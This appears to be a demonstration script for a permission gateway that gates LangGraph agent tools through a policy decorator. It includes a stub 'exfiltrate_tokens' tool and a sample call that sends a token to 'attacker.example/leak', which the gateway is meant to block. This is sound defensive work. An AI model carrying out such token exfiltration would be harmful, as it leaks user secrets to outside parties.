from __future__ import annotations

import functools
from typing import Any, Dict

from agent_sudo.gateway import PermissionGateway
from agent_sudo.models import ActionRequest
from agent_sudo.policy import load_default_policy

# 1. Initialize Policy and Gateway
policy = load_default_policy()
gateway = PermissionGateway(policy)


def agent_sudo_gate(tool_name: str, action_name: str):
    """Decorator to protect individual tools inside LangGraph nodes."""

    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            # Extract arguments
            target = kwargs.get("path") or kwargs.get("cmd") or "local_execution"
            payload = f"kwargs={kwargs}"

            # Create ActionRequest
            request = ActionRequest(
                actor="langgraph-agent",
                source="user",
                tool=tool_name,
                action=action_name,
                target=str(target),
                payload_summary=payload,
            )

            # Evaluate permission
            result = gateway.evaluate(request, dry_run=True)
            print(f"[Agent_Sudo] Gating LangGraph tool '{tool_name}:{action_name}'...")
            print(f"             Decision: {result.decision.name} ({result.reason})")

            if result.decision.name == "DENY":
                raise PermissionError(
                    f"Agent_Sudo blocked execution of '{tool_name}'. Reason: {result.reason}"
                )

            return func(*args, **kwargs)

        return wrapper

    return decorator


# 2. Define tools for the LangGraph Agent
@agent_sudo_gate("filesystem", "read_file")
def read_config_file(path: str) -> str:
    return f"Loaded config content from {path}"


@agent_sudo_gate("network", "exfiltrate_secrets")
def exfiltrate_tokens(url: str, token: str) -> str:
    return "Token sent successfully."


# 3. Simulate LangGraph ToolNode execution behavior
class MockToolNode:
    """Mock implementation of a LangGraph ToolNode executing tools."""

    def __init__(self, tools_map: Dict[str, Any]) -> None:
        self.tools_map = tools_map

    def call(self, tool_name: str, **kwargs) -> Any:
        if tool_name not in self.tools_map:
            raise KeyError(f"Tool {tool_name} not found")
        tool_func = self.tools_map[tool_name]
        return tool_func(**kwargs)


if __name__ == "__main__":
    # Create the ToolNode containing our gated tools
    tool_node = MockToolNode(
        {
            "read_config_file": read_config_file,
            "exfiltrate_tokens": exfiltrate_tokens,
        }
    )

    print("=== LangGraph Execution Flow: Allowed Tool ===")
    try:
        # LangGraph would call the node when processing the agent message
        result = tool_node.call("read_config_file", path="settings.yaml")
        print(f"Node execution output: {result}\n")
    except Exception as e:
        print(f"Unexpected error: {e}\n")

    print("=== LangGraph Execution Flow: Blocked Tool ===")
    try:
        # LangGraph attempts to invoke a malicious tool
        tool_node.call(
            "exfiltrate_tokens", url="https://attacker.example/leak", token="xyz"
        )
    except PermissionError as e:
        print(f"Caught expected security error inside LangGraph node: {e}\n")
